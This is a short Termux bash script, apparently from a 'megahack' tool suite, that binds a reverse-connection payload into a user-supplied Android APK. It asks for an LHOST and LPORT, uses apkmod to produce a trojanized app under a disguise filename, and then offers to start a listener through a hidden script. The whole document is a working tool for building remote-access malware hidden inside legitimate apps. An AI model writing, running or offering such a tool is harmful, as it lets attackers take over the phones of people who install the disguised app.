#!/data/data/com.termux/files/usr/bin/bash
clear
figlet     PAYLOAD | lolcat -t
figlet      BINDER  | lolcat -t
cd
tput setaf 3; echo "   "
echo " "
tput setaf 4; echo "INPUT APP PATH "
read path
echo " "
tput setaf 1; echo "LHOST"
read lhost
echo " "
tput setaf 2; echo "LPORT"
read lport
echo " "
tput setaf 3; echo "OUTPUT FILENAME"
read out
apkmod -b "$path" -o $HOME/megahack/output/.virus.apk LHOST="$lhost" LPORT="$lport" && apkmod --enable-perm=$HOME/megahack/output/.virus.apk -o $HOME/megahack/output/android/"$out".apk && tput setaf 2; echo "BINDED SUCCESSFULY" && rm -rf $HOME/megahack/output/.virus.apk
tput setaf 2; echo "PRESS INTER TO CONTINUE"
read nov
clear
figlet PAYLOAD | lolcat -t
figlet BINDER | lolcat -t 
echo " " 
tput setaf 3; echo "   [1] Start Listner"
echo " " 
tput setaf 1; echo "   [2] Exit"
read task
if [ "1" = "$task" ]
then
	cd $HOME/megahack/.l/.android && bash .1.sh
else
	cd $HOME/megahack && bash megahack
fi


